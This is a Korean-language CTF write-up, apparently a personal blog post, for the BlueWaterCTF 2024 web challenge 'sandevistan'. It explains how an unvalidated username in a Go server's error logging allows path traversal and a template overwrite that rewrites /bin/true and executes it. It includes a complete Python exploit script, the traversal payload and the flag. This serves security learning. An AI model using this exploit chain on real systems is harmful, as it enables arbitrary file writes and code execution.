---
layout: post
title: BlueWaterCTF 2024    
description: CTF Write-up
tags: BlueWaterCTF     
category: ctf 
---   
	 
# BlueWaterCTF

## 대회 일정
**2024-10-12 23:00 ~ 2024-10-14 11:00**     
	
## 대회 후기          
	  
<img src="/assets/images/ctf/2024/bluewater/scoreboard.jpg" width=700px>        
	
화이트햇 준비도 할겸 오랜만에 CTF 대회를 참가했다. 13일 저녁에 시작했는데 웹 솔브가 많이나지 않은 것을 보고 배워갈 게 많은 대회라고 생각하고 임했다. 루비야랩 팀으로 나가게 되었고 웹은 총 5문제가 나왔는데 그 중 1문제를 풀었다.                 
			   
## Writeup     
	 
- <a href="#sandevistan">sandevistan</a>      
	 
<a id="sandevistan"></a>          

# sandevistan              
	 
32 solved / 212 pts     
	
```go
func (s *Server) Serve() error {
	r := mux.NewRouter()
	path := filepath.Join(utils.GetCwd(), "static")

	r.PathPrefix("/static/").Handler(http.StripPrefix("/static", http.FileServer(http.Dir(path))))
	r.HandleFunc("/", root)
	r.HandleFunc("/cyberware", s.cwHandleGet).Methods("GET")
	r.HandleFunc("/cyberware", s.cwHandlePost).Methods("POST")
	r.HandleFunc("/user", s.handleUserGet).Methods("GET")
	r.HandleFunc("/user", s.handleUserPost).Methods("POST")
	return http.ListenAndServe(":8080", r)
}
```    
   
웹은 Go 언어로 작성되어있고 `/cyberware`, `/user` 경로에 요청을 보낼 수 있게 되어있다.    

```go
package server

import (
	"Sandevistan/models"
	"Sandevistan/utils"

	"net/http"
	"errors"
	"fmt"
	"context"
)

func (s *Server) AppendToUsers(u *models.User) {
	s.Users[u.Name] = u
}

func (s *Server) GetUser(username string) (*models.User, error) {
	user, exists := s.Users[username]
	if !exists {
		return nil, errors.New("user not found")
	}
	return user, nil
}

func (s *Server) handleUserPost(w http.ResponseWriter, r *http.Request) {
	u, uerr := s.GetUser(r.FormValue("username"))
	if uerr != nil {
		ctx := r.Context()
		ctx = context.WithValue(ctx, "username", "NOUSER")
		username := r.FormValue("username")
		ue := utils.AlphaNumCheck(ctx, username)
		if ue != nil {
			http.Error(w, "BAD CHARACTERS IN USERNAME", http.StatusBadRequest)
			return
		}
		cyberwares := make(map[string]models.CyberWare, 0)
		errs := make([]*models.UserError, 0)
		u = &models.User{
			Name: r.FormValue("username"),
			Augments: cyberwares,
			Errors: errs,
		}
		s.AppendToUsers(u)
		fmt.Println(s.Users)
	}
	http.Redirect(w, r, "/user", http.StatusFound)
}

func (s *Server) handleUserGet(w http.ResponseWriter, r *http.Request) {
	u, err := s.GetUser(r.FormValue("username"))
	if err != nil {
		http.Error(w, "Username not found", http.StatusNotFound)
		return
	}

	if u.Name == "NOUSER" {
		http.Redirect(w, r, "/", http.StatusFound)
	}
	utils.RenderTemplate(w, "/tmpl/user", u)
}
```      
	
`/user` 엔드포인트 쪽 코드를 보면, POST 요청을 보내 새로운 유저를 생성할 수 있고, GET 요청을 통해 유저 프로필에 접근이 가능하다.    

```go
package server

import (
	"Sandevistan/utils"
	"Sandevistan/database"
	"Sandevistan/models"
	"net/http"
	"math/rand/v2"
	"context"
)

func (s *Server) cwHandleGet(w http.ResponseWriter, r *http.Request){
	ctx := r.Context()
	single := r.FormValue("cyberware")
	if single != "" {
		ware, serr := db.GetCyberWare(s.dbClient, ctx, single)
		if serr != nil {
			http.Error(w, serr.Error(), http.StatusNotFound)
			return
		}
		utils.RenderTemplate(w, "/tmpl/cyberware", ware)
		return
	}
	http.Error(w, "Please specify a CyberWare", http.StatusBadRequest)
	return
}

func checkForm(r *http.Request) *models.UserError {
	var ue *models.UserError
	ctx := r.Context()
	username, exists := r.Form["username"]
	if !exists {
		ue = &models.UserError{
			Value: "NOUSER",
			Filename: "nouser",
			Ctx: ctx,
		}
		return ue
	}
	ctx = context.WithValue(ctx, "username", username[len(username)-1])
	cwName, exists := r.Form["name"]
	if !exists {
		ue = utils.ErrorFactory(ctx, "CyberWare name doesn't exist", username[len(username)-1])
		return ue
	}
	ue = utils.AlphaNumCheck(ctx, cwName[0])
	return ue
}

func (s *Server) cwHandlePost(w http.ResponseWriter, r *http.Request){
	err := r.ParseForm()
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	ue := checkForm(r)
	username := r.PostForm["username"]
	user, uerr := s.GetUser(username[len(username)-1])
	if uerr != nil {
		user, _ = s.GetUser("NOUSER")
	}
	if ue != nil { 
		user.AddError(ue)
		http.Error(w, "BAD REQUEST", http.StatusBadRequest)
		return
	}
	name:= r.PostForm["name"]

	cw := models.CyberWare{
		Name: name[len(name)-1],
		BaseQuality: rand.IntN(10), 
		Capacity: rand.IntN(10),
		Iconic: false,
		Username: username[len(username)-1],
	}
	_, cerr := db.InsertCyberware(s.dbClient, cw)
	if cerr != nil {
		http.Error(w, cerr.Error(), http.StatusInternalServerError)
		return
	}
	user.AddCyberWare(cw)
	http.Redirect(w, r, "/cyberware", http.StatusFound)
}
```  
		 
`/cyberware` POST 요청을 보내면, `checkForm()` 함수를 거쳐 `AlphaNumCheck()` 함수가 호출된다.        

```go
func AlphaNumCheck(ctx context.Context, t string) *models.UserError {
	if !regexp.MustCompile(`^[a-zA-Z0-9]*$`).MatchString(t) {
		v := fmt.Sprintf("ERROR! Invalid Value: %s\n", t)
		username := ctx.Value("username")
		regexErr := ErrorFactory(ctx, v, username.(string))
		return regexErr
	}
	return nil
}

func ErrorFactory(ctx context.Context, v string, f string) *models.UserError {
	filename := "errorlog/" + f
	UErr := &models.UserError{
		v,
		f,
		ctx,
	}
	file, _ := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0644)
	defer file.Close()

	file.WriteString(v)
	return UErr
}
```           
	
`AlphaNumCheck()` 함수에서 `username`을 정규표현식을 통해 검증한다. 하지만, 정규표현식에 매칭되지 않는 문자가 포함될 경우 에러를 발생시켜 `errorlog` 디렉터리에 에러 로그 파일을 생성하고 `ERROR! Invalid Value: %s` 내용을 저장한다.       

하지만, `username`에대해 Path Traversal 검증이 이루어지고 있지 않아 원하는 경로에 원하는 파일을 쓸 수 있게 된다.   
	  
```go
package models

import (
	"context"
	"os"
	"errors"
	"os/exec"
)

type UserError struct {
	Value		string
	Filename	string
	Ctx			context.Context
}

type User struct {
	Name			string
	Augments		map[string]CyberWare
	Errors			[]*UserError
}

func (u *User) AllCyberWares() map[string]CyberWare {
	return u.Augments
}

func (u *User) AddCyberWare(cw CyberWare) {
	u.Augments[cw.Name] = cw
}

func (u *User) AddError(ue *UserError) {
	u.Errors = append(u.Errors, ue)
}

func (u *User) NewError(val string, fname string) *UserError {
	ctx := context.Background()
	ue := &UserError{
		Value: val,
		Filename: fname,
		Ctx: ctx,
	}
	u.Errors = append(u.Errors, ue)
	return ue
}

func (u *User) SerializeErrors(data string, index int, offset int64) error {
	fname := u.Errors[index]

	if fname == nil {
		return errors.New("Error not found")
	}
 
	f, err := os.OpenFile(fname.Filename, os.O_RDWR, 0)
	if err != nil {
		return errors.New("File not found")
	}
	defer f.Close()

	_, ferr := f.WriteAt([]byte(data), offset)
	if ferr != nil {
		return errors.New("File error writing")
	}

	return nil
}

func (u *User) UserHealthcheck() ([]byte, error) {
	cmd := exec.Command("/bin/true")	
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, errors.New("error in healthcheck")
		panic(err)
	}
	return output, nil
}
```            
`models/user.go` 파일에서 `UserHealthcheck()` 메서드에서 `/bin/true`를 실행하는 것을 확인할 수 있었고, `/bin/true` 파일을 Overwrite 하도록 시도했다. 하지만, `ERROR! Invalid Value: ` 문자가 포함되어있어 실행 파일 포맷 형식에 맞지 않아 에러가 발생한다.     
	 
```go
func (u *User) NewError(val string, fname string) *UserError {
	ctx := context.Background()
	ue := &UserError{
		Value: val,
		Filename: fname,
		Ctx: ctx,
	}
	u.Errors = append(u.Errors, ue)
	return ue
}

func (u *User) SerializeErrors(data string, index int, offset int64) error {
	fname := u.Errors[index]

	if fname == nil {
		return errors.New("Error not found")
	}
 
	f, err := os.OpenFile(fname.Filename, os.O_RDWR, 0)
	if err != nil {
		return errors.New("File not found")
	}
	defer f.Close()

	_, ferr := f.WriteAt([]byte(data), offset)
	if ferr != nil {
		return errors.New("File error writing")
	}

	return nil
}
```     
그래서, `/bin/true`에 바이트 값을 쓸 수 있는 타겟을 찾아보았고, `models/user.go` 파일에서 `NewError`, `SerializeErrors` 메서드가 있는 것을 확인했다.    

정리하자면, `/app/tmpl/user.html` 파일을 덮어써 템플릿 엔진에서 `NewError`, `SerializeErrors` 메서드를 호출하여 `/bin/true` 파일에 `/readflag` 바이너리 값을 써주고, `UserHealthcheck` 메서드를 호출하면 된다.    

### Exploit Code    
```python
import requests

def binary_to_hex_string(binary_data):
	hex_string = ''.join(f'\\x{byte:02x}' for byte in binary_data)
	return hex_string

binary_data = open("readflag","rb").read()  
hex_representation = binary_to_hex_string(binary_data)

# url = "http://localhost:7777" 
url = "http://sandevistan.chal.perfect.blue:28945"

r = requests.post(
	f"{url}/user", 
	data={
		"username": "asdf",
	}
)
print(r.status_code)
print(r.text)

r = requests.post(
	f"{url}/cyberware", 
	data={
		"username": "../../../../../../../app/tmpl/user.html", # 경로
		"name": b"""
<!DOCTYPE html>
	<head>
		<link rel="stylesheet" href="static/css/style.css">
		<!-- cool cyberpunk theme from gwannon: https://github.com/gwannon/Cyberpunk-2077-theme-css -->
	</head>
	<body>
		<h2 class="cyberpunk glitched">Hello {{.Name}}!</h1>
		<h3 class="cyberpunk glitched">Here are your cyberwares.</h2>
		<hr />
		{% raw %}
		<div class="cyberwares">
			{{.NewError "xxxxx" "/bin/true"}}
			{{.SerializeErrors \""""+ hex_representation.encode() +b"""\" 0 0}}
			{{.UserHealthcheck}}
		</div>
		{% endraw %}
	</body>
</html>
"""# 내용
	}
)
print(r.status_code)
print(r.text)

r = requests.get(
	f"{url}/user", 
	params={
		"username": "asdf",
	}
)
print(r.status_code)
print(r.text)
```     
	 
### Flag     
bwctf{YoU_kNoW_yOu_d1dnt_l0s3_Ur_53Lf-coNtR0L._LEt'5_start_at_the_r4inB0w}     
	 